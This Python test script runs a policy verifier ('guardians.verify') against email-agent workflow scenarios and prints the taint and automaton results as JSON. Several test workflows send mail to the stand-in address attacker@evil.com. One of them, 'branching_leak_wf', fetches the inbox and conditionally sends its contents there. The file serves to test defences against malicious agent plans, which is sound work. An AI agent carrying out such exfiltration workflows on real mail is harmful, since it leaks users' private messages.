# Runs the REAL Python guardians.verify() on the same scenarios as scenarios.ts
# and prints {ok, taint, automaton} per scenario as JSON. Reuses the example's
# registry/policy and its safe/malicious workflows; builds the extra scenarios.
import json
import os
import sys

here = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.join(here, "..", "..", "guardians", "examples"))

import email_agent as ex  # noqa: E402
from guardians import (  # noqa: E402
    verify, Workflow, WorkflowStep, ToolCallNode, ConditionalNode, SymRef,
)


def summ(r):
    return {
        "ok": r.ok,
        "taint": any(v.category == "taint" for v in r.violations),
        "automaton": any(v.category == "automaton" for v in r.violations),
    }


literal_send_wf = Workflow(
    goal="send a non-secret note externally",
    steps=[WorkflowStep(label="Send", tool_call=ToolCallNode(
        tool_name="send_email",
        arguments={"to": "attacker@evil.com", "subject": "hi", "body": "just a public note"},
    ))],
)

branching_leak_wf = Workflow(
    goal="conditionally exfiltrate",
    steps=[
        WorkflowStep(label="Fetch", tool_call=ToolCallNode(
            tool_name="fetch_mail", arguments={"folder": "inbox"}, result_binding="emails")),
        WorkflowStep(label="Branch", conditional=ConditionalNode(
            condition="flag",
            then_steps=[WorkflowStep(label="Send", tool_call=ToolCallNode(
                tool_name="send_email",
                arguments={"to": "attacker@evil.com", "subject": "x", "body": SymRef(ref="emails")}))],
            else_steps=[WorkflowStep(label="Summ", tool_call=ToolCallNode(
                tool_name="summarize_emails",
                arguments={"emails": SymRef(ref="emails")}, result_binding="summary"))],
        )),
    ],
)

fetch_then_literal_wf = Workflow(
    goal="fetch then send a literal note externally",
    steps=[
        WorkflowStep(label="Fetch", tool_call=ToolCallNode(
            tool_name="fetch_mail", arguments={"folder": "inbox"}, result_binding="emails")),
        WorkflowStep(label="Send", tool_call=ToolCallNode(
            tool_name="send_email",
            arguments={"to": "attacker@evil.com", "subject": "x", "body": "public note"})),
    ],
)

out = {
    "safe": summ(verify(ex.safe_wf, ex.policy, ex.registry)),
    "malicious": summ(verify(ex.malicious_wf, ex.policy, ex.registry)),
    "literalSend": summ(verify(literal_send_wf, ex.policy, ex.registry)),
    "branchingLeak": summ(verify(branching_leak_wf, ex.policy, ex.registry)),
    "fetchThenLiteralSend": summ(verify(fetch_then_literal_wf, ex.policy, ex.registry)),
}
print(json.dumps(out))
